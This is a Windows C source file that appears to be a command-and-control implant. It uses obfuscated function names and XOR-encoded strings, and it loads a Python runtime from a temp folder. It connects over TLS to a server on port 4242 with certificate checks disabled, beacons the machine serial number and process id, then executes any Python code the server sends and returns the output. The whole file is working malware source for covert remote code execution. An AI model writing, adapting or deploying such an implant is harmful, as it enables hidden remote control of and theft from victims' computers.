#define SECURITY_WIN32 1

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>
#ifdef _WIN32
#include <process.h>
#else
#include <unistd.h>
#endif
#include <python3.11/Python.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

#define ExecutePythonCode g5_2_2lthb4
#define GetSystemSerialNumber g6_2_2lthb4
#define base64_encode g7_2_2lthb4
#define Route g8_2_2lthb4
#define ConnectAndCommunicate g9_2_2lthb4
#define xor_decode g10_2_2lthb4

// XOR decoding function
void xor_decode(const char* encoded, char* decoded, size_t len, const char* key, size_t key_len) {
    for (size_t i = 0; i < len; ++i) {
        decoded[i] = encoded[i] ^ key[i % key_len];
    }
    decoded[len] = '\0';
}

int ExecutePythonCode(const char* code, char* output, size_t output_size) {
    const char xor_key[] = "0ltbh2lthb4";
    size_t key_len = strlen(xor_key);

    // XOR-encoded Python home directory path
    const char python_path_xor[] = {
        0x73, 0x56, 0x28, 0x36, 0x0D, 0x5F, 0x1C, 0x28, 0x58, 0x57, 0x52, 0x44,
        0x54, 0x2B, 0x50, 0x04, 0x46, 0x04, 0x16, 0x5C
    };
    size_t python_path_len = sizeof(python_path_xor);

    char python_path[256];
    xor_decode(python_path_xor, python_path, python_path_len, xor_key, key_len);

    // Set the directory containing the python DLL in the search path
    SetDllDirectoryA("C:\\Temp\\05ft8_2lthb4\\");
    
    // Load the Python DLL from the specified path
    HMODULE hPy = LoadLibraryExA("C:\\Temp\\05ft8_2lthb4\\python311.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!hPy) {
        fprintf(stderr, "Failed to load Python DLL from custom location. Error: %lu\n", GetLastError());
        return -1;
    }

    // Set the Python home directory
    wchar_t wpython_path[256];
    mbstowcs(wpython_path, python_path, 256);
    Py_SetPythonHome(wpython_path);

    // Optionally set the program name (helps Python find related files)
    Py_SetProgramName(L"python.exe"); // can be any name, ideally matches your embedded python scenario

    // Set the Python path so Python can find its standard library and other modules
    Py_SetPath(L"C:\\Temp\\05ft8_2lthb4\\python311.zip;"
               L"C:\\Temp\\05ft8_2lthb4\\Lib;"
               L"C:\\Temp\\05ft8_2lthb4\\DLLs");

    // Initialize Python
    if (!Py_IsInitialized()) {
        Py_Initialize();
    }

    // Redirect sys.stdout to StringIO
    PyObject *pySys = PyImport_ImportModule("sys");
    PyObject *pyIo = PyImport_ImportModule("io");
    if (!pySys || !pyIo) {
        if (pySys) Py_DECREF(pySys);
        if (pyIo) Py_DECREF(pyIo);
        SecureZeroMemory(python_path, sizeof(python_path));
        return -1;
    }

    PyObject *pyStringIO = PyObject_CallMethod(pyIo, "StringIO", NULL);
    if (!pyStringIO) {
        Py_DECREF(pySys);
        Py_DECREF(pyIo);
        SecureZeroMemory(python_path, sizeof(python_path));
        return -1;
    }

    PyObject_SetAttrString(pySys, "stdout", pyStringIO);
    Py_DECREF(pySys);
    Py_DECREF(pyIo);

    // Execute the provided Python code
    int res = PyRun_SimpleString(code);
    if (res != 0) {
        // Execution failed
        Py_DECREF(pyStringIO);
        SecureZeroMemory(python_path, sizeof(python_path));
        return res;
    }

    // Retrieve the output
    PyObject *pyGetValue = PyObject_CallMethod(pyStringIO, "getvalue", NULL);
    if (pyGetValue && PyUnicode_Check(pyGetValue)) {
        const char *pyOutput = PyUnicode_AsUTF8(pyGetValue);
        if (pyOutput) {
            char temp_buffer[output_size];
            strncpy(temp_buffer, pyOutput, output_size - 1);
            temp_buffer[output_size - 1] = '\0';

            // Strip trailing newlines
            size_t len = strlen(temp_buffer);
            while (len > 0 && (temp_buffer[len - 1] == '\n' || temp_buffer[len - 1] == '\r')) {
                temp_buffer[len - 1] = '\0';
                len--;
            }

            strncpy(output, temp_buffer, output_size - 1);
            output[output_size - 1] = '\0';
        }
        Py_DECREF(pyGetValue);
    }

    Py_DECREF(pyStringIO);

    SecureZeroMemory(python_path, sizeof(python_path));

    return 0;
}




void GetSystemSerialNumber(char *buffer, size_t size) {
    const char code_xor[] = {
        0x59, 0x01, 0x04, 0x0D, 0x1A, 0x46, 0x4C, 0x1B, 0x1B, 0x59, 0x44, 0x42,
        0x05, 0x1A, 0x16, 0x40, 0x5D, 0x1F, 0x5A, 0x18, 0x0D, 0x44, 0x55, 0x02,
        0x5C, 0x45, 0x1F, 0x5F, 0x05, 0x17, 0x48, 0x01, 0x47, 0x40, 0x1E, 0x1B,
        0x06, 0x1D, 0x51, 0x18, 0x54, 0x0F, 0x07, 0x40, 0x10, 0x19, 0x01, 0x0B,
        0x0C, 0x15, 0x45, 0x5A, 0x1A, 0x07, 0x55, 0x54, 0x44, 0x5D, 0x4C, 0x1B,
        0x46, 0x1E, 0x1D, 0x18, 0x4A, 0x1D, 0x1E, 0x1F, 0x04, 0x0E, 0x01, 0x46,
        0x00, 0x1D, 0x06, 0x07, 0x47, 0x18, 0x45, 0x2F, 0x4F, 0x59, 0x6F, 0x45
    };
    char code[256];
    xor_decode(code_xor, code, sizeof(code_xor) / sizeof(code_xor[0]), "0ltbh2lthb4", strlen("0ltbh2lthb4"));
    ExecutePythonCode(code, buffer, size);
}

static const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* base64_encode(const unsigned char* input, size_t length) {
    size_t output_len = 4 * ((length + 2) / 3);
    char* encoded = (char*)malloc(output_len + 1);
    if (encoded == NULL) return NULL;

    size_t i = 0, j = 0;
    size_t remaining = length;

    while (remaining >= 3) {
        encoded[j++] = base64_chars[input[i] >> 2];
        encoded[j++] = base64_chars[((input[i] & 0x03) << 4) | (input[i + 1] >> 4)];
        encoded[j++] = base64_chars[((input[i + 1] & 0x0f) << 2) | (input[i + 2] >> 6)];
        encoded[j++] = base64_chars[input[i + 2] & 0x3f];
        remaining -= 3;
        i += 3;
    }

    if (remaining) {
        encoded[j++] = base64_chars[input[i] >> 2];
        if (remaining == 1) {
            encoded[j++] = base64_chars[(input[i] & 0x03) << 4];
            encoded[j++] = '=';
        } else {
            encoded[j++] = base64_chars[((input[i] & 0x03) << 4) | (input[i + 1] >> 4)];
            encoded[j++] = base64_chars[(input[i + 1] & 0x0f) << 2];
        }
        encoded[j++] = '=';
    }

    encoded[j] = '\0';
    return encoded;
}


int Route(const char *recv_data, char *output, size_t output_size) {
    return ExecutePythonCode(recv_data, output, output_size);
}

int ConnectAndCommunicate() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    struct hostent *host_info;
    char send_data[256];
    char recv_data[1024];
    char output[1024];
    int send_len, recv_len;
    char server_address[256] = "127.0.0.1"; 
    int server_port = 4242;

    CredHandle hCred = { 0 };
    CtxtHandle hContext = { 0 };
    SECURITY_STATUS Status;
    TimeStamp tsExpiry;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    SCHANNEL_CRED SchannelCred = { 0 };
    SchannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    // Enable all TLS versions as Python's ssl.create_default_context() supports them
    SchannelCred.grbitEnabledProtocols = SP_PROT_TLS1 | SP_PROT_TLS1_1 | SP_PROT_TLS1_2;
    SchannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | 
                          SCH_USE_STRONG_CRYPTO |
                          SCH_CRED_MANUAL_CRED_VALIDATION |  // Allow self-signed certs
                          SCH_CRED_NO_SERVERNAME_CHECK;      // Don't verify hostname

    Status = AcquireCredentialsHandleA(
        NULL,                   // pszPrincipal
        UNISP_NAME_A,          // pszPackage
        SECPKG_CRED_OUTBOUND,  // fCredentialUse
        NULL,                   // pvLogonID
        &SchannelCred,         // pAuthData
        NULL,                   // pGetKeyFn
        NULL,                   // pvGetKeyArgument
        &hCred,                // phCredential
        &tsExpiry              // ptsExpiry
    );

    if (Status != SEC_E_OK) {
        WSACleanup();
        return 1;
    }

    host_info = gethostbyname(server_address);
    if (host_info == NULL) {
        FreeCredentialsHandle(&hCred);
        WSACleanup();
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        FreeCredentialsHandle(&hCred);
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    memcpy(&server.sin_addr, host_info->h_addr, host_info->h_length);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        FreeCredentialsHandle(&hCred);
        WSACleanup();
        return 1;
    }

    // Perform SSL handshake
    DWORD dwSSPIFlags = ISC_REQ_STREAM | 
                        ISC_REQ_USE_SUPPLIED_CREDS |
                        ISC_REQ_CONFIDENTIALITY | 
                        ISC_RET_EXTENDED_ERROR |
                        ISC_REQ_ALLOCATE_MEMORY | 
                        ISC_REQ_REPLAY_DETECT;

    DWORD dwSSPIOutFlags = 0;
    DWORD cbData = 0;
    BOOL doRead = TRUE;
    char IoBuffer[16384];
    SecBufferDesc OutBuffer = { 0 };
    SecBuffer OutBuffers[1] = { 0 };
    BOOL handshakeDone = FALSE;

    // Initial handshake data
    OutBuffer.ulVersion = SECBUFFER_VERSION;
    OutBuffer.cBuffers = 1;
    OutBuffer.pBuffers = OutBuffers;

    OutBuffers[0].pvBuffer = NULL;
    OutBuffers[0].BufferType = SECBUFFER_TOKEN;
    OutBuffers[0].cbBuffer = 0;

    Status = InitializeSecurityContextA(
        &hCred,                // phCredential
        NULL,                  // phContext
        server_address,        // pszTargetName
        dwSSPIFlags,          // fContextReq
        0,                     // Reserved1
        SECURITY_NATIVE_DREP,  // TargetDataRep
        NULL,                  // pInput
        0,                     // Reserved2
        &hContext,            // phNewContext
        &OutBuffer,           // pOutput
        &dwSSPIOutFlags,      // pfContextAttr
        &tsExpiry             // ptsExpiry
    );

    if (Status != SEC_I_CONTINUE_NEEDED) {
        goto cleanup;
    }

    // Send initial handshake data
    if (OutBuffers[0].cbBuffer != 0 && OutBuffers[0].pvBuffer != NULL) {
        send_len = send(sock, OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
        FreeContextBuffer(OutBuffers[0].pvBuffer);
        OutBuffers[0].pvBuffer = NULL;
        if (send_len <= 0) {
            goto cleanup;
        }
    }

    // Handshake loop
    cbData = 0;
    while (!handshakeDone) {
        if (doRead) {
            recv_len = recv(sock, IoBuffer + cbData, sizeof(IoBuffer) - cbData, 0);
            if (recv_len <= 0) {
                goto cleanup;
            }
            cbData += recv_len;
        }

        SecBufferDesc InBuffer = { 0 };
        SecBuffer InBuffers[2] = { 0 };
        
        InBuffer.ulVersion = SECBUFFER_VERSION;
        InBuffer.cBuffers = 2;
        InBuffer.pBuffers = InBuffers;

        InBuffers[0].pvBuffer = IoBuffer;
        InBuffers[0].cbBuffer = cbData;
        InBuffers[0].BufferType = SECBUFFER_TOKEN;

        InBuffers[1].pvBuffer = NULL;
        InBuffers[1].cbBuffer = 0;
        InBuffers[1].BufferType = SECBUFFER_EMPTY;

        OutBuffers[0].pvBuffer = NULL;
        OutBuffers[0].cbBuffer = 0;
        OutBuffers[0].BufferType = SECBUFFER_TOKEN;

        Status = InitializeSecurityContextA(
            &hCred,
            &hContext,
            NULL,
            dwSSPIFlags,
            0,
            SECURITY_NATIVE_DREP,
            &InBuffer,
            0,
            NULL,
            &OutBuffer,
            &dwSSPIOutFlags,
            &tsExpiry);

        if (Status == SEC_E_OK) {
            handshakeDone = TRUE;
            break;
        } else if (Status == SEC_I_CONTINUE_NEEDED || 
                   Status == SEC_E_INCOMPLETE_MESSAGE) {
            if (OutBuffers[0].cbBuffer != 0 && OutBuffers[0].pvBuffer != NULL) {
                send_len = send(sock, OutBuffers[0].pvBuffer, OutBuffers[0].cbBuffer, 0);
                FreeContextBuffer(OutBuffers[0].pvBuffer);
                if (send_len <= 0) {
                    goto cleanup;
                }
            }

            if (Status == SEC_E_INCOMPLETE_MESSAGE) {
                doRead = TRUE;
                continue;
            }

            if (InBuffers[1].BufferType == SECBUFFER_EXTRA) {
                memmove(IoBuffer, IoBuffer + (cbData - InBuffers[1].cbBuffer),
                       InBuffers[1].cbBuffer);
                cbData = InBuffers[1].cbBuffer;
            } else {
                cbData = 0;
            }
            doRead = TRUE;
            continue;
        } else {
            goto cleanup;
        }
    }


    char serial[64];
    GetSystemSerialNumber(serial, sizeof(serial));

    snprintf(send_data, sizeof(send_data), "agent|||%s|||%d", serial, getpid());
    
    SecPkgContext_StreamSizes Sizes;
    Status = QueryContextAttributes(&hContext, SECPKG_ATTR_STREAM_SIZES, &Sizes);
    if (Status != SEC_E_OK) {
        goto cleanup;
    }

    int total_size = Sizes.cbHeader + strlen(send_data) + Sizes.cbTrailer;
    BYTE* encrypted_data = (BYTE*)malloc(total_size);
    if (!encrypted_data) {
        goto cleanup;
    }

    SecBuffer Buffers[3] = { 0 };
    SecBufferDesc Message = { 0 };

    Buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
    Buffers[0].cbBuffer = Sizes.cbHeader;
    Buffers[0].pvBuffer = encrypted_data;

    Buffers[1].BufferType = SECBUFFER_DATA;
    Buffers[1].cbBuffer = strlen(send_data);
    Buffers[1].pvBuffer = encrypted_data + Sizes.cbHeader;
    memcpy(Buffers[1].pvBuffer, send_data, Buffers[1].cbBuffer);

    Buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
    Buffers[2].cbBuffer = Sizes.cbTrailer;
    Buffers[2].pvBuffer = encrypted_data + Sizes.cbHeader + strlen(send_data);

    Message.ulVersion = SECBUFFER_VERSION;
    Message.cBuffers = 3;
    Message.pBuffers = Buffers;

    Status = EncryptMessage(&hContext, 0, &Message, 0);
    if (Status != SEC_E_OK) {
        free(encrypted_data);
        goto cleanup;
    }

    send_len = send(sock, encrypted_data, total_size, 0);
    free(encrypted_data);

    if (send_len == SOCKET_ERROR || send_len == 0) {
        goto cleanup;
    }


    BYTE decrypt_buffer[4096];
    recv_len = recv(sock, decrypt_buffer, sizeof(decrypt_buffer), 0);
    if (recv_len > 0) {
        SecBuffer DecryptBuffers[4] = { 0 };
        SecBufferDesc DecryptMsg = { 0 };

        DecryptBuffers[0].BufferType = SECBUFFER_DATA;
        DecryptBuffers[0].cbBuffer = recv_len;
        DecryptBuffers[0].pvBuffer = decrypt_buffer;

        DecryptBuffers[1].BufferType = SECBUFFER_EMPTY;
        DecryptBuffers[2].BufferType = SECBUFFER_EMPTY;
        DecryptBuffers[3].BufferType = SECBUFFER_EMPTY;

        DecryptMsg.ulVersion = SECBUFFER_VERSION;
        DecryptMsg.cBuffers = 4;
        DecryptMsg.pBuffers = DecryptBuffers;

        Status = DecryptMessage(&hContext, &DecryptMsg, 0, NULL);
        if (Status == SEC_E_OK) {
            PSecBuffer pDataBuffer = NULL;
            for (DWORD i = 1; i < 4; i++) {
                if (DecryptBuffers[i].BufferType == SECBUFFER_DATA) {
                    pDataBuffer = &DecryptBuffers[i];
                    break;
                }
            }

            if (pDataBuffer) {
                memcpy(recv_data, pDataBuffer->pvBuffer, pDataBuffer->cbBuffer);
                recv_data[pDataBuffer->cbBuffer] = '\0';

                if (Route(recv_data, output, sizeof(output)) == 0) {
                    total_size = Sizes.cbHeader + strlen(output) + Sizes.cbTrailer;
                    encrypted_data = (BYTE*)malloc(total_size);
                    if (encrypted_data) {
                        Buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
                        Buffers[0].cbBuffer = Sizes.cbHeader;
                        Buffers[0].pvBuffer = encrypted_data;

                        Buffers[1].BufferType = SECBUFFER_DATA;
                        Buffers[1].cbBuffer = strlen(output);
                        Buffers[1].pvBuffer = encrypted_data + Sizes.cbHeader;
                        memcpy(Buffers[1].pvBuffer, output, Buffers[1].cbBuffer);

                        Buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
                        Buffers[2].cbBuffer = Sizes.cbTrailer;
                        Buffers[2].pvBuffer = encrypted_data + Sizes.cbHeader + strlen(output);

                        Message.ulVersion = SECBUFFER_VERSION;
                        Message.cBuffers = 3;
                        Message.pBuffers = Buffers;

                        Status = EncryptMessage(&hContext, 0, &Message, 0);
                        if (Status == SEC_E_OK) {
                            send_len = send(sock, encrypted_data, total_size, 0);
                        }
                        free(encrypted_data);
                    }
            }
        }
    }

cleanup:
    DeleteSecurityContext(&hContext);
    FreeCredentialsHandle(&hCred);
    closesocket(sock);
    WSACleanup();
    return 0;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return ConnectAndCommunicate();
}